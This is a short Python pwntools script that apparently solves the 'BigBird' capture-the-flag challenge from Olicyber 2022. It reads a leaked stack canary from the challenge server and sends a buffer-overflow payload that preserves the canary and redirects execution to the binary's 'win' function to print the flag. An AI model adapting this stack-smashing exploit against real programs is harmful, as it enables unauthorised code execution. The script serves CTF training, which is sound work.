from pwn import *

exe = context.binary = ELF("Olicyber_2022/Nazionale/BigBird/bigbird")

HOST = "bigbird.challs.olicyber.it"
PORT = 12006

r = remote(HOST, PORT)
r.recvuntil(b"BIG BIRD: ")

canary = int(r.recvline(False), 16)

r.sendlineafter(b"good music", flat({0x28: canary, 0x38: exe.sym['win']}))
r.recvlines(2)

flag = r.recvline().decode()
print(flag)

r.close()